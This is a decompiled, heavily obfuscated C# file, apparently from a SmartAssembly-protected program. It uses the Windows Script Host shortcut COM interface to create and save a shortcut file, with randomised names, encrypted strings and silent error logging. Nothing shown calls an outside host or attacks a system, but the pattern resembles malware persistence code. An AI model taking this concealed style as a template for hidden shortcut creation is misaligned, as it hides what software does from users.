using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wawLLalyhHSFm;

public sealed class uoPfPeVTik
{
	[ComImport]
	[Guid("F935DC23-1CF0-11D0-ADB9-00C04FD58A0B")]
	[TypeLibType(4160)]
	private interface ixWMSIqnTYNkskFu
	{
		[DispId(0)]
		string chSdfrkHCebcW
		{
			[DispId(0)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
		}

		[DispId(1000)]
		string AwLfhSLraBi
		{
			[DispId(1000)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1000)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1001)]
		string UrirNauOGjD
		{
			[DispId(1001)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1001)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1002)]
		string azsTFLDTwOjCvZ
		{
			[DispId(1002)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1002)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1003)]
		string KObixFmXJvNf
		{
			[DispId(1003)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1003)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1004)]
		string FVDlxrMVkxks
		{
			[DispId(1004)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1005)]
		string UvKhNjkiNQtUFIi
		{
			[DispId(1005)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1005)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1006)]
		int jGtvxTYsMQSpHV
		{
			[DispId(1006)]
			get;
			[DispId(1006)]
			[param: In]
			set;
		}

		[DispId(1007)]
		string XbDjWnErJXIID
		{
			[DispId(1007)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1007)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[TypeLibFunc(64)]
		[DispId(2000)]
		void Load([In][MarshalAs(UnmanagedType.BStr)] string PathLink);

		[DispId(2001)]
		void Save();
	}

	private static Type QoibDUDOOusfO;

	private static object onclrRdJaSG;

	[NonSerialized]
	internal static GetString getString_0;

	public static void mfzelyWDStJIB(string string_0, string string_1, string string_2, string string_3, string string_4, string string_5, string string_6)
	{
		try
		{
			ixWMSIqnTYNkskFu ixWMSIqnTYNkskFu = (ixWMSIqnTYNkskFu)QoibDUDOOusfO.InvokeMember(ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107399032)), BindingFlags.InvokeMethod, null, onclrRdJaSG, new object[1] { string_0 });
			ixWMSIqnTYNkskFu.UrirNauOGjD = string_4;
			ixWMSIqnTYNkskFu.azsTFLDTwOjCvZ = string_5;
			ixWMSIqnTYNkskFu.UvKhNjkiNQtUFIi = string_1;
			ixWMSIqnTYNkskFu.XbDjWnErJXIID = string_3;
			ixWMSIqnTYNkskFu.AwLfhSLraBi = string_2;
			if (!string.IsNullOrEmpty(string_6))
			{
				ixWMSIqnTYNkskFu.KObixFmXJvNf = string_6;
			}
			ixWMSIqnTYNkskFu.Save();
		}
		catch (Exception ex)
		{
			if (ufSaqXYLSvVxK.YGBzDBzlDVGPdcyT)
			{
				try
				{
					File.AppendAllText(ufSaqXYLSvVxK.ZmxznfzcMXVgTR, getString_0(107399003) + ex.Message + getString_0(107396684));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static uoPfPeVTik()
	{
		Strings.CreateGetStringDelegate(typeof(uoPfPeVTik));
		QoibDUDOOusfO = Type.GetTypeFromProgID(ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107398926)));
		onclrRdJaSG = Activator.CreateInstance(QoibDUDOOusfO);
	}
}
